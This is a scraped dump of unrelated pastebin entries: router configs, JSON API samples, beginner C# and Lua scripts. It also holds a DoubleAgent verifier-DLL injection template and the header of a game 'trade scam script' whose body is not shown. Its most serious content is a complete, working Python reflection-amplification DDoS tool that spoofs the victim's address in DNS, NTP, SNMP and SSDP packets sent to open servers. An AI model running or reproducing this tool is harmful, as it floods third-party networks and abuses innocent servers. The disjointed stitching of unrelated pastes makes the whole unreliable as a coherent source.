		/* The process is running under WOW64, the OS is 64 bit */
		eOsArchitectureLocal = OS_ARCHITECTURE_X64;
	}
	else
	{
		/* The process is not running under WOW64, the OS is 32 bit */
		eOsArchitectureLocal = OS_ARCHITECTURE_X86;
	}
#endif

	/* Sets the received parameters */
	*peOsArchitecture = eOsArchitectureLocal;

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

lbl_cleanup:
	/* Returns status */
	return eStatus;
}"
DqybtWta,DoubleAgentDll/main.c,FlyFar,C,Tuesday 2nd of January 2024 03:32:16 AM CDT,"/* Includes ******************************************************************/
#include <Windows.h>
#include ""Status.h""
#include ""Process.h""
#include ""VerifierDll.h""

/* Function Declarations *****************************************************/
/*
 * The event handler for DLL attach events
 */
static BOOL main_DllMainProcessAttach(VOID);
/*
 * The event handler for DLL detach events
 */
static BOOL main_DllMainProcessDetach(VOID);

/* Function Definitions ******************************************************/
BOOL WINAPI DllMain(IN HINSTANCE hInstDLL, IN SIZE_T nReason, IN PVOID pvReserved)
{
	UNREFERENCED_PARAMETER(hInstDLL);

	/* Process Attach */
	if (VERIFIERDLL_DLL_PROCESS_VERIFIER == nReason)
	{
		return VERIFIERDLL_DllMainProcessVerifier(pvReserved);
	}

	else if (DLL_PROCESS_ATTACH == nReason)
	{
		return main_DllMainProcessAttach();
	}

	/* Process Detach */
	else if (DLL_PROCESS_DETACH == nReason)
	{
		return main_DllMainProcessDetach();
	}

	/* Thread Attach\Detach */
	else
	{
		return TRUE;
	}
}

static BOOL main_DllMainProcessAttach(VOID)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;

	/*
	 **************************************************************************
	 Enter Your Code Here
	 **************************************************************************
	 */

	 /* Sample Code - Launch cmd.exe */
	 //eStatus = PROCESS_Create(L""cmd.exe"");
	 //if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	 //{
	 //	goto lbl_cleanup;
	 //}

	 /* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

	//lbl_cleanup:
	/* Returns status */
	return FALSE != DOUBLEAGENT_SUCCESS(eStatus);
}

static BOOL main_DllMainProcessDetach(VOID)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;

	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

	/* Returns status */
	return FALSE != DOUBLEAGENT_SUCCESS(eStatus);
}"
rbhY21yd,[MUF] Vehicle Series WIth OTR,ffajarpratama,JSON,Tuesday 2nd of January 2024 03:21:59 AM CDT,"{
    ""success"": true,
    ""data"": {
        ""list"": [
            {
                ""vehicle_series_id"": ""01740a38-da17-4bfc-abc8-05ed4fd64213"",
                ""name"": ""AVANZA"",
                ""vehicle_brand_id"": ""69e0ff1b-3417-489b-876f-28be7fe73e12"",
                ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                ""code"": """",
                ""created_at"": 1701242399,
                ""updated_at"": 1701242399,
                ""deleted_at"": 0,
                ""min_price"": 200000000,
                ""max_price"": 250000000,
                ""domicile_name"": ""Jabodetabek & Serang"",
                ""vehicle_brand"": {
                    ""vehicle_brand_id"": ""69e0ff1b-3417-489b-876f-28be7fe73e12"",
                    ""name"": ""TOYOTA"",
                    ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                    ""code"": ""01Y"",
                    ""media_id"": ""0759df50-449b-4ef3-8e8a-451034a45531"",
                    ""created_at"": 1691577703,
                    ""updated_at"": 1691577703,
                    ""deleted_at"": 0,
                    ""vehicle_group"": null,
                    ""media"": null
                },
                ""vehicle_group"": null,
                ""vehicle_otrs"": null
            },
            {
                ""vehicle_series_id"": ""71fb21f9-ff7a-4579-8b39-89a89f9b9afb"",
                ""name"": ""RAIZE"",
                ""vehicle_brand_id"": ""69e0ff1b-3417-489b-876f-28be7fe73e12"",
                ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                ""code"": """",
                ""created_at"": 1701242399,
                ""updated_at"": 1701242399,
                ""deleted_at"": 0,
                ""min_price"": 250000000,
                ""max_price"": 250000000,
                ""domicile_name"": ""Jabodetabek & Serang"",
                ""vehicle_brand"": {
                    ""vehicle_brand_id"": ""69e0ff1b-3417-489b-876f-28be7fe73e12"",
                    ""name"": ""TOYOTA"",
                    ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                    ""code"": ""01Y"",
                    ""media_id"": ""0759df50-449b-4ef3-8e8a-451034a45531"",
                    ""created_at"": 1691577703,
                    ""updated_at"": 1691577703,
                    ""deleted_at"": 0,
                    ""vehicle_group"": null,
                    ""media"": null
                },
                ""vehicle_group"": null,
                ""vehicle_otrs"": null
            }
        ],
        ""paging"": {
            ""count"": 2,
            ""current_page"": 1,
            ""limit"": 10,
            ""total_page"": 1,
            ""has_next"": false
        }
    },
    ""message"": ""Success"",
    ""errors"": null
}"
8nM8Z8ZF,C#_1_lesson,Legiomax,C#,Tuesday 2nd of January 2024 03:09:43 AM CDT,"using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace C_Ijun
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int damageHit;
            bool heroDeath;
            float supplyCount;
            char cityName;
            string heroName;
            ulong ammoCount;
            short mapCoordinate;
            ushort heroCharacter;
            uint fullHeroInfo;
            byte heroHealth;
        }
    }
}
"
w5v9T8Qu,Untitled,kondratyev,Bash,Tuesday 2nd of January 2024 03:08:33 AM CDT,"# 2024-01-02 10:59:26 by RouterOS 7.11.2
# software id = JVBD-W32S
#
# model = C53UiG+5HPaxD2HPaxD
# serial number = HEE08K74018
/interface bridge
    add admin-mac=48:A9:8A:BD:F6:4C auto-mac=no comment=defconf name=bridge
/interface ethernet
    set [ find default-name=ether3 ] comment=""QNAP NAS""
    set [ find default-name=ether5 ] comment=""Rpi server""
/interface wifiwave2
    set [ find default-name=wifi1 ] channel.skip-dfs-channels=10min-cac comment=""5 GHz WLAN"" configuration.country=Ukraine .mode=ap .ssid=WiFi \
    disabled=no security.authentication-types=wpa2-psk,wpa3-psk
set [ find default-name=wifi2 ] channel.skip-dfs-channels=10min-cac comment=""2.4 GHz WLAN"" configuration.country=Ukraine .mode=ap .ssid=WiFi_2 \
    disabled=no mtu=1500 security.authentication-types=wpa2-psk,wpa3-psk
add configuration.hide-ssid=no .mode=ap .ssid=connect-bridge disabled=no mac-address=4A:A9:8A:BD:F6:50 master-interface=wifi1 mtu=1500 name=wifi3 \
    security.authentication-types=wpa2-psk .encryption=ccmp,gcmp,ccmp-256,gcmp-256 .wps=disable
/interface pppoe-client
    add add-default-route=yes disabled=no interface=ether1 name=PPPoE use-peer-dns=yes user=username
/interface list
    add comment=defconf name=WAN
    add comment=defconf name=LAN
/ip pool
    add name=dhcp ranges=192.168.88.10-192.168.88.254
    add comment=""Pool for OpenVPN"" name=openvpn ranges=172.12.10.10-172.12.10.100
/ip dhcp-server
    add address-pool=dhcp always-broadcast=yes interface=bridge lease-time=10m name=defconf server-address=192.168.88.1
/ppp profile
    add comment=""Profile for OpenVPN"" local-address=172.12.10.1 name=""OpenVPN Server"" remote-address=openvpn
/interface bridge port
    add bridge=bridge comment=defconf interface=ether2
    add bridge=bridge comment=defconf interface=ether3
    add bridge=bridge comment=defconf interface=ether4
    add bridge=bridge comment=defconf interface=ether5
    add bridge=bridge comment=defconf interface=wifi1
    add bridge=bridge comment=defconf interface=wifi2
    add bridge=bridge interface=wifi3
/ip neighbor discovery-settings
    set discover-interface-list=LAN
/interface detect-internet
    set detect-interface-list=WAN
/interface list member
    add comment=defconf interface=bridge list=LAN
    add comment=defconf disabled=yes interface=ether1 list=WAN
    add interface=PPPoE list=WAN
/interface ovpn-server server
    set auth=sha1,md5,sha256 certificate=100.100.100.100 cipher=blowfish128,aes128-cbc,aes256-cbc,aes128-gcm,aes256-gcm default-profile=""OpenVPN Server"" \
    enabled=yes protocol=udp
/ip address
    add address=192.168.88.1/24 comment=defconf interface=bridge network=192.168.88.0
/ip dhcp-server lease
    add address=192.168.88.44 client-id=1:cc:2d:e0:32:95:85 mac-address=CC:2D:E0:32:95:85 server=defconf
    add address=192.168.88.18 client-id=1:b8:27:eb:cb:31:56 mac-address=B8:27:EB:CB:31:56 server=defconf
/ip dhcp-server network
    add address=192.168.88.0/24 comment=defconf dns-server=192.168.88.1 gateway=192.168.88.1
/ip dns
    set allow-remote-requests=yes
/ip dns static
    add address=192.168.88.1 comment=defconf name=router.lan
/ip firewall filter
    add action=accept chain=input comment=""defconf: accept established,related,untracked"" connection-state=established,related,untracked
    add action=drop chain=input comment=""defconf: drop invalid"" connection-state=invalid
    add action=accept chain=input comment=""defconf: accept ICMP"" protocol=icmp
    add action=accept chain=input comment=""defconf: accept to local loopback (for CAPsMAN)"" dst-address=127.0.0.1
    add action=drop chain=input comment=""defconf: drop all not coming from LAN"" in-interface-list=!LAN
    add action=accept chain=forward comment=""defconf: accept in ipsec policy"" ipsec-policy=in,ipsec
    add action=accept chain=forward comment=""defconf: accept out ipsec policy"" ipsec-policy=out,ipsec
    add action=fasttrack-connection chain=forward comment=""defconf: fasttrack"" connection-state=established,related hw-offload=yes
    add action=accept chain=forward comment=""defconf: accept established,related, untracked"" connection-state=established,related,untracked
    add action=drop chain=forward comment=""defconf: drop invalid"" connection-state=invalid
    add action=drop chain=forward comment=""defconf: drop all from WAN not DSTNATed"" connection-nat-state=!dstnat connection-state=new disabled=yes \
    in-interface-list=WAN
    add action=drop chain=input comment=""Drop PPPoE input"" in-interface=PPPoE
    add action=accept chain=input comment=""Accept OpenVPN connection"" dst-port=1194 in-interface=PPPoE log=yes log-prefix=OVPN- protocol=udp
/ip firewall nat
    add action=masquerade chain=srcnat comment=""Masquerade for DHCP client"" disabled=yes ipsec-policy=out,none out-interface-list=WAN
    add action=masquerade chain=srcnat comment=""Masquerade PPPoE traffic"" log=yes log-prefix=OVPN-MASQUERADE- out-interface=PPPoE
    add action=netmap chain=dstnat comment=""Forward SMB/CIFS from NAS to WAN"" disabled=yes dst-port=445 in-interface=PPPoE protocol=tcp to-addresses=\
    192.168.88.200 to-ports=445
    add action=netmap chain=dstnat comment=""Forward NAS UI to WAN"" disabled=yes dst-port=4438 in-interface=PPPoE log=yes protocol=tcp to-addresses=\
    192.168.88.200 to-ports=443
/ip firewall service-port
    set ftp disabled=yes
    set tftp disabled=yes
    set sip disabled=yes
/ipv6 firewall address-list
    add address=::/128 comment=""defconf: unspecified address"" list=bad_ipv6
    add address=::1/128 comment=""defconf: lo"" list=bad_ipv6
    add address=fec0::/10 comment=""defconf: site-local"" list=bad_ipv6
    add address=::ffff:0.0.0.0/96 comment=""defconf: ipv4-mapped"" list=bad_ipv6
    add address=::/96 comment=""defconf: ipv4 compat"" list=bad_ipv6
    add address=100::/64 comment=""defconf: discard only "" list=bad_ipv6
    add address=2001:db8::/32 comment=""defconf: documentation"" list=bad_ipv6
    add address=2001:10::/28 comment=""defconf: ORCHID"" list=bad_ipv6
    add address=3ffe::/16 comment=""defconf: 6bone"" list=bad_ipv6
/ipv6 firewall filter
    add action=accept chain=input comment=""defconf: accept established,related,untracked"" connection-state=established,related,untracked
    add action=drop chain=input comment=""defconf: drop invalid"" connection-state=invalid
    add action=accept chain=input comment=""defconf: accept ICMPv6"" protocol=icmpv6
    add action=accept chain=input comment=""defconf: accept UDP traceroute"" port=33434-33534 protocol=udp
    add action=accept chain=input comment=""defconf: accept DHCPv6-Client prefix delegation."" dst-port=546 protocol=udp src-address=fe80::/10
    add action=accept chain=input comment=""defconf: accept IKE"" dst-port=500,4500 protocol=udp
    add action=accept chain=input comment=""defconf: accept ipsec AH"" protocol=ipsec-ah
    add action=accept chain=input comment=""defconf: accept ipsec ESP"" protocol=ipsec-esp
    add action=accept chain=input comment=""defconf: accept all that matches ipsec policy"" ipsec-policy=in,ipsec
    add action=drop chain=input comment=""defconf: drop everything else not coming from LAN"" in-interface-list=!LAN
    add action=accept chain=forward comment=""defconf: accept established,related,untracked"" connection-state=established,related,untracked
    add action=drop chain=forward comment=""defconf: drop invalid"" connection-state=invalid
    add action=drop chain=forward comment=""defconf: drop packets with bad src ipv6"" src-address-list=bad_ipv6
    add action=drop chain=forward comment=""defconf: drop packets with bad dst ipv6"" dst-address-list=bad_ipv6
    add action=drop chain=forward comment=""defconf: rfc4890 drop hop-limit=1"" hop-limit=equal:1 protocol=icmpv6
    add action=accept chain=forward comment=""defconf: accept ICMPv6"" protocol=icmpv6
    add action=accept chain=forward comment=""defconf: accept HIP"" protocol=139
    add action=accept chain=forward comment=""defconf: accept IKE"" dst-port=500,4500 protocol=udp
    add action=accept chain=forward comment=""defconf: accept ipsec AH"" protocol=ipsec-ah
    add action=accept chain=forward comment=""defconf: accept ipsec ESP"" protocol=ipsec-esp
    add action=accept chain=forward comment=""defconf: accept all that matches ipsec policy"" ipsec-policy=in,ipsec
    add action=drop chain=forward comment=""defconf: drop everything else not coming from LAN"" in-interface-list=!LAN
/ppp secret
    add comment=""Secret for OpenVPN user andrii"" name=andrii profile=""OpenVPN Server"" service=ovpn
/system clock
    set time-zone-name=Europe/Kiev
/system identity
    set name=brvk
/system note
    set note=%C9
/system ntp client
    set enabled=yes
/system ntp client servers
    add address=0.ua.pool.ntp.org
/tool mac-server
    set allowed-interface-list=LAN
/tool mac-server mac-winbox
    set allowed-interface-list=LAN
/tool sniffer
    set filter-interface=PPPoE filter-ip-protocol=udp filter-port=1194 streaming-enabled=yes streaming-server=192.168.88.10"
x81xPc0T,Creating the Manifest,vapvarun,JSON,Tuesday 2nd of January 2024 01:31:15 AM CDT,"{
  ""name"": ""My Awesome App"",
  ""short_name"": ""AwesomeApp"",
  ""start_url"": ""/"",
  ""display"": ""standalone"",
  ""background_color"": ""#fff"",
  ""description"": ""An awesome app doing awesome things"",
  ""icons"": [{
    ""src"": ""images/icon.png"",
    ""sizes"": ""192x192"",
    ""type"": ""image/png""
  }]
}
"
6Fk4Ge0i,Register a Service Worker,vapvarun,JavaScript,Tuesday 2nd of January 2024 01:29:50 AM CDT,"if ('serviceWorker' in navigator) {
  window.addEventListener('load', function() {
    navigator.serviceWorker.register('/service-worker.js').then(function(registration) {
      // Registration was successful
      console.log('ServiceWorker registration successful with scope: ', registration.scope);
    }, function(err) {
      // registration failed :(
      console.log('ServiceWorker registration failed: ', err);
    });
  });
}
"
xzemYKUD,Untitled,yeyi9,Python,Tuesday 2nd of January 2024 12:50:43 AM CDT,"#!/usr/bin/env python3
import sys
import time
import socket
import struct
import threading
from random import randint
import argparse

USAGE = '''
%prog target.com [options]        # DDoS
%prog benchmark [options]         # 计算放大因子
'''

LOGO = r'''
   ___        _                 _       ___   ___  ___                   _         _     _     
  / _ \  _ _ | | __ _  _ _   __| | ___ | _ \ / __|| _ \ ___  _ __  __ _ (_) _ _   | |__ (_) ___
 | (_) || '_|| |/ _` || ' \ / _` |/ _ \|  _/| (__ |   // -_)| '_ \/ _` || || '_|_ | '_ \| ||_ /
  \___/ |_|  |_|\__,_||_||_|\__,_|\___/|_|   \___||_|_\\___|| .__/\__,_||_||_| (_)|_.__/|_|/__/
                                                            |_|                                
        www.OrlandoPCRepair.biz
    https://youtube.com/user/OrlandoPCRepair
       https://twitter.com/OrlandoPCRepair
'''

HELP = (
    'DNS放大文件和要解析的域名（例如：dns.txt:[evildomain.com|domains_file.txt]',
    'NTP放大文件',
    'SNMP放大文件',
    'SSDP放大文件',
    '线程数（默认=1）')

BENCHMARK = (
    '协议'
    '|  IP地址  '
    '|     放大     '
    '|     域名    '
    '\n{}').format('-' * 75)

ATTACK = (
    '     发送      '
    '|    流量    '
    '|    包/秒   '
    '|     比特/秒     '
    '\n{}').format('-' * 63)

PORT = {
    'dns': 53,
    'ntp': 123,
    'snmp': 161,
    'ssdp': 1900
}

PAYLOAD = {
    'dns': ('{}\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01'
            '{}\x00\x00\xff\x00\xff\x00\x00\x29\x10\x00'
            '\x00\x00\x00\x00\x00\x00\x00'),
    'snmp': ('\x30\x26\x02\x01\x01\x04\x06\x70\x75\x62\x6c'
             '\x69\x63\xa5\x19\x02\x04\x71\xb4\xb5\x68\x02\x01'
             '\x00\x02\x01\x7F\x30\x0b\x30\x09\x06\x05\x2b\x06'
             '\x01\x02\x01\x05\x00'),
    'ntp': ('\x17\x00\x02\x2a' + '\x00' * 4),
    'ssdp': ('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n'
             'MAN: ""ssdp:discover""\r\nMX: 2\r\nST: ssdp:all\r\n\r\n')
}

amplification = {
    'dns': {},
    'ntp': {},
    'snmp': {},
    'ssdp': {}
}  # 放大因子

FILE_NAME = 0  # 文件名索引
FILE_HANDLE = 1  # 文件描述符索引

npackets = 0  # 发送的数据包数量
nbytes = 0  # 反射的字节数
files = {}  # 放大文件

npackets_lock = threading.Lock()  # 添加锁
nbytes_lock = threading.Lock()  # 添加锁

SUFFIX = {
    0: '',
    1: 'K',
    2: 'M',
    3: 'G',
    4: 'T'
}


def Calc(n, d, unit=''):
    i = 0
    r = float(n)
    while r / d >= 1:
        r = r / d
        i += 1
    return '{:.2f}{}{}'.format(r, SUFFIX[i], unit)


def GetDomainList(domains):
    domain_list = []

    if '.TXT' in domains.upper():
        file = open(domains, 'r')
        content = file.read()
        file.close()
        content = content.replace('\r', '')
        content = content.replace(' ', '')
        content = content.split('\n')
        for domain in content:
            if domain:
                domain_list.append(domain)
    else:
        domain_list = domains.split(',')
    return domain_list


def Monitor():
    '''
        监控攻击
    '''
    print(ATTACK)
    FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
    start = time.time()
    while True:
        try:
            current = time.time() - start
            bps = (nbytes * 8) / current
            pps = npackets / current
            with npackets_lock, nbytes_lock:
                out = FMT.format(Calc(npackets, 1000),
                                 Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
            sys.stderr.write('\r{}{}'.format(out, ' ' * (60 - len(out))))
            time.sleep(1)
        except KeyboardInterrupt:
            print('\n中断')
            break
        except Exception as err:
            print('\n错误:', str(err))
            break


def AmpFactor(recvd, sent):
    return '{}x ({}B -> {}B)'.format(recvd / sent, sent, recvd)


def Benchmark(ddos):
    print(BENCHMARK)
    i = 0
    for proto in files:
        f = open(files[proto][FILE_NAME], 'r')
        while True:
            soldier = f.readline().strip()
            if soldier:
                if proto == 'dns':
                    for domain in ddos.domains:
                        i += 1
                        recvd, sent = ddos.GetAmpSize(proto, soldier, domain)
                        if recvd / sent:
                            print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier,
                                                                     AmpFactor(recvd, sent), domain))
                        else:
                            continue
                else:
                    recvd, sent = ddos.GetAmpSize(proto, soldier)
                    print('{:^8}|{:^15}|{:^23}|{}'.format(proto, soldier,
                                                             AmpFactor(recvd, sent), 'N/A'))
                    i += 1
            else:
                break
        print('总计测试:', i)
        f.close()


class DDoS(object):
    def __init__(self, target, threads, domains, event):
        self.target = target
        self.threads = threads
        self.event = event
        self.domains = domains

    def stress(self):
        for i in range(self.threads):
            t = threading.Thread(target=self.__attack)
            t.start()

    def __send(self, sock, soldier, proto, payload):
        '''
            发送伪造的数据包
        '''
        udp = struct.pack('!H', randint(1, 65535)) + struct.pack('!H', PORT[proto]) + payload
        ip = struct.pack('!BBHHHBBH4s4s', 69, 0, 20 + len(udp), randint(1, 65535), 0, 64, socket.IPPROTO_UDP,
                         0, socket.inet_aton(self.target), socket.inet_aton(soldier))
        sock.sendto(ip + udp, (soldier, PORT[proto]))

    def GetAmpSize(self, proto, soldier, domain=''):
        '''
            获取放大大小
        '''
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        data = ''
        if proto in ['ntp', 'ssdp']:
            packet = PAYLOAD[proto]
            self.__send(sock, soldier, proto, packet)
            try:
                while True:
                    data += sock.recvfrom(65535)[0]
            except socket.timeout:
                sock.close()
                return len(data), len(packet)
        if proto == 'dns':
            packet = self.__GetDnsQuery(domain)
        else:
            packet = PAYLOAD[proto]
        try:
            self.__send(sock, soldier, proto, packet)
            data, _ = sock.recvfrom(65535)
        except socket.timeout:
            data = ''
        finally:
            sock.close()
        return len(data), len(packet)

    def __GetQName(self, domain):
        '''
            QNAME是一个域名，由标签的序列表示，
            每个标签都包含一个长度
            八位字节，后跟该数量的字节
        '''
        labels = domain.split('.')
        QName = b''
        for label in labels:
            if len(label):
                QName += struct.pack('!B', len(label)) + label.encode('utf-8')
        return QName

    def __GetDnsQuery(self, domain):
        id = struct.pack('!H', randint(0, 65535))
        QName = self.__GetQName(domain)
        return PAYLOAD['dns'].format(id, QName)

    def __attack(self):
        global npackets
        global nbytes
        _files = files
        for proto in _files:  # 打开放大文件
            f = open(_files[proto][FILE_NAME], 'r')
            _files[proto].append(f)  # _files = {'proto':['file_name', file_handle]}
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        i = 0
        while self.event.is_set():
            for proto in _files:
                soldier = _files[proto][FILE_HANDLE].readline().strip()
                if soldier:
                    if proto == 'dns':
                        if not amplification[proto].get(soldier):
                            amplification[proto][soldier] = {}
                        for domain in self.domains:
                            if not amplification[proto][soldier].get(domain):
                                size, _ = self.GetAmpSize(proto, soldier, domain)
                                if size == 0:
                                    break
                                elif size < len(PAYLOAD[proto]):
                                    continue
                                else:
                                    amplification[proto][soldier][domain] = size
                                amp = self.__GetDnsQuery(domain)
                                self.__send(sock, soldier, proto, amp)
                                with npackets_lock, nbytes_lock:
                                    npackets += 1
                                    i += 1
                                    nbytes += amplification[proto][soldier][domain]
                    else:
                        if not amplification[proto].get(soldier):
                            size, _ = self.GetAmpSize(proto, soldier)
                            if size < len(PAYLOAD[proto]):
                                continue
                            else:
                                amplification[proto][soldier] = size
                            amp = PAYLOAD[proto]
                            with npackets_lock, nbytes_lock:
                                npackets += 1
                                i += 1
                                nbytes += amplification[proto][soldier]
                            self.__send(sock, soldier, proto, amp)
                else:
                    _files[proto][FILE_HANDLE].seek(0)
        sock.close()
        for proto in _files:
            _files[proto][FILE_HANDLE].close()


def main():
    parser = argparse.ArgumentParser(usage=USAGE)
    parser.add_argument('target', help='目标主机')
    parser.add_argument('-d', '--dns', metavar='FILE:FILE|DOMAIN', help=HELP[0])
    parser.add_argument('-n', '--ntp', metavar='FILE', help=HELP[1])
    parser.add_argument('-s', '--snmp', metavar='FILE', help=HELP[2])
    parser.add_argument('-p', '--ssdp', metavar='FILE', help=HELP[3])
    parser.add_argument('-t', '--threads', type=int, default=1, metavar='N', help=HELP[4])

    args = parser.parse_args()

    target = args.target
    domains = []

    if args.dns:
        dns_parts = args.dns.split(':')
        if len(dns_parts) == 2:
            domains = GetDomainList(dns_parts[1])
            args.dns = dns_parts[0]

    if args.target == ""benchmark"":
        Benchmark(DDoS(args.target, args.threads, domains, threading.Event()))
    else:
        # 创建 DDoS 实例并启动攻击
        ddos = DDoS(target, args.threads, domains, threading.Event())
        ddos.stress()

        # 启动监控线程
        monitor_thread = threading.Thread(target=Monitor)
        monitor_thread.start()

        # 等待攻击结束
        try:
            monitor_thread.join()
        except KeyboardInterrupt:
            print(""\n攻击结束，程序退出。"")


if __name__ == '__main__':
    print(LOGO)
    main()
"
zi9zc8sK,dev UpdateJournalEntry KAFE,BlackBoY_,JSON,Tuesday 2nd of January 2024 12:43:19 AM CDT,"{
    ""docname"":""ACC-JV-2024-00053"",
    ""updates"":{
        ""voucher_type"": ""Journal Entry"",
        ""company"": ""Kopkar Toyota"",
        ""posting_date"": ""2023-12-26"",
        ""cheque_no"": ""INV-2023-00001"",
        ""cheque_date"": ""2023-12-26"",
        ""total_debit"": 4000000000.0,
        ""total_credit"": 4000000000.0,
        ""difference"": 0.0,
        ""multi_currency"": 0,
        ""total_amount_currency"": ""IDR"",
        ""total_amount"": 4000000000.0,
        ""accounts"": [
            {
                ""account"": ""130-10"",
                ""account_type"": ""Receivable"",
                ""balance"": 12000000.0,
                ""party_type"": ""Customer"",
                ""party"": ""Anggota"",
                ""party_balance"": 12000000.0,
                ""cost_center"": ""Main - Kopkar Toyota"",
                ""account_currency"": ""IDR"",
                ""exchange_rate"": 1.0,
                ""debit_in_account_currency"": 4000000000.0,
                ""debit"": 4000000000.0,
                ""credit_in_account_currency"": 0.0,
                ""credit"": 0.0,
                ""is_advance"": ""No"",
                ""against_account"": ""Family Mart"",
                ""parentfield"": ""accounts"",
                ""parenttype"": ""Journal Entry"",
                ""doctype"": ""Journal Entry Account""
            },
            {

                ""account"": ""210-10"",
                ""account_type"": ""Payable"",
                ""balance"": -12000000.0,
                ""party_type"": ""Supplier"",
                ""party"": ""Family Mart"",
                ""party_balance"": 0.0,
                ""cost_center"": ""Main - Kopkar Toyota"",
                ""account_currency"": ""IDR"",
                ""exchange_rate"": 1.0,
                ""debit_in_account_currency"": 0.0,
                ""debit"": 0.0,
                ""credit_in_account_currency"": 4000000000.0,
                ""credit"": 4000000000.0,
                ""is_advance"": ""No"",
                ""against_account"": ""Anggota"",
                ""parentfield"": ""accounts"",
                ""parenttype"": ""Journal Entry"",
                ""doctype"": ""Journal Entry Account""
            }
    ]   
    }  
}"
JfaRpvRv,dev CreateJournalEntry KAFE,BlackBoY_,JSON,Tuesday 2nd of January 2024 12:37:56 AM CDT,"{
    ""voucher_type"": ""Journal Entry"",
    ""company"": ""Kopkar Toyota"",
    ""posting_date"": ""2023-12-26"",
    ""cheque_no"": ""INV-2023-00001"",
    ""cheque_date"": ""2023-12-26"",
    ""difference"": 0.0,
    ""multi_currency"": 0,
    ""total_amount_currency"": ""IDR"",
    ""accounts"": [
        {
            ""account"": ""510-11"",
            // ""account_type"": ""Receivable"",
            // ""party_type"": ""Customer"",
            // ""party"": ""Anggota"",
            ""cost_center"": ""Main - Kopkar Toyota"",
            ""account_currency"": ""IDR"",
            ""exchange_rate"": 1.0,
            ""debit_in_account_currency"": 4000000000.0,
            ""debit"": 4000000000.0,
            ""credit_in_account_currency"": 0.0,
            ""credit"": 0.0,
            ""is_advance"": ""No"",
            ""against_account"": ""Family Mart"",
            ""parentfield"": ""accounts"",
            ""parenttype"": ""Journal Entry"",
            ""doctype"": ""Journal Entry Account""
        },
        {
            ""account"": ""148-01"",
            // ""account_type"": ""Payable"",
            // ""party_type"": """",
            // ""party"": """",
            ""party_balance"": 0.0,
            ""cost_center"": ""Main - Kopkar Toyota"",
            ""account_currency"": ""IDR"",
            ""exchange_rate"": 1.0,
            ""debit_in_account_currency"": 0.0,
            ""debit"": 0.0,
            ""credit_in_account_currency"": 4000000000.0,
            ""credit"": 4000000000.0,
            ""is_advance"": ""No"",
            ""against_account"": ""Anggota"",
            ""parentfield"": ""accounts"",
            ""parenttype"": ""Journal Entry"",
            ""doctype"": ""Journal Entry Account""
        }
    ]
}
"
ccMDV5wZ,Tekkit 2 Hops Autofarm,0xymoron98,Lua,Tuesday 2nd of January 2024 12:31:55 AM CDT,"print( ""Hops Farm by 0xymoron"" )

local len = 47 -- length of farm (subtract 1 for place computer takes up)
local item = ""extratrees:hops"" -- item you're farming

function plantSeed()
    for i = 1, 16 do
        local data = turtle.getItemDetail( i )
        if data and data.name == item then
            turtle.select( i )
            turtle.place()
            print( ""Planting seed"" )
        end
    end
end

function checkCrop()
    local success, crop = turtle.inspect()
    if success then
        local status = crop.state.age or 0
        if status == 7 then
            turtle.up()
            turtle.dig()
            turtle.down()
            plantSeed()
        end
    else
        plantSeed()
    end
end

function checkFarm()
    print( ""Checking farm..."" )
    turtle.turnRight()
    checkCrop()
    turtle.turnLeft()
	for i = 1, len do
		turtle.forward()
        turtle.turnRight()
        checkCrop()
        turtle.turnLeft()
	end
    turtle.turnRight()
    turtle.turnRight()
    returnHome()
end

function returnHome()
    print( ""Returning home..."" )
	for i = 1, len do
		turtle.forward()
	end
    manageInventory()
end

function manageInventory()
    print( ""Managing inventory..."" )
    -- dump inv
    for i = 1, 16 do
        local data = turtle.getItemDetail( i )
        if data and data.name == item then
            local count = turtle.getItemCount( i )
            turtle.select( i )
            turtle.drop()
            print( ""Stored "" .. count .. "" "" .. data.name or ""nil"" )
        end
    end
    -- grab fuel
    if turtle.getFuelLevel() < 50 then
        turtle.up()
        turtle.suck( 64 )
        turtle.select( 1 )
        turtle.refuel()
        turtle.down()
        print( ""Refuled"" )
    end
    print( ""Inventory managed"" )
    turtle.turnRight()
    turtle.turnRight()
    checkFarm()
end
    
manageInventory()"
rv3ZjBR4,Strinf Explozien,Krum_50,C#,Monday 1st of January 2024 11:56:55 PM CDT,"using System;

namespace String_Explosion
{
    class Program
    {
        static void Main(string[] args)
        {
            string input = Console.ReadLine();
            int strength = 0;
            int i = 0;
            int lengthOfString = input.Length;
            while (i < lengthOfString)
            {
                if (input[i] == '>')
                { 
                    strength = int.Parse(input[i + 1].ToString());
                
                    if (strength == 1)
                    {
                        input.Remove(i + 1);
                        i++;
                    }
                    else
                    {
                        for (int j = 0; j < i + strength; j++)
                        {
                            if (input[j] != '>')
                            {
                                input.Remove(j);
                            }
                            else
                            {
                                i += j;
                            }
                        }
                    }
                }
                else
                {
                    i++;
                }
            }

            Console.WriteLine(input);                              
                
        }
    }
}
"
48ztWAUW,Pet Simulator 99!  🎉 2024 Trade Scam Script,Project-WD,Lua,Monday 1st of January 2024 11:44:17 PM CDT,"--Pet Simulator 99! 🎉 Trade Scam Script! (Copy and Put on Executor)
-------------------------------------------------------
--🆕 Updated (02/01/2024)
--Script📝:
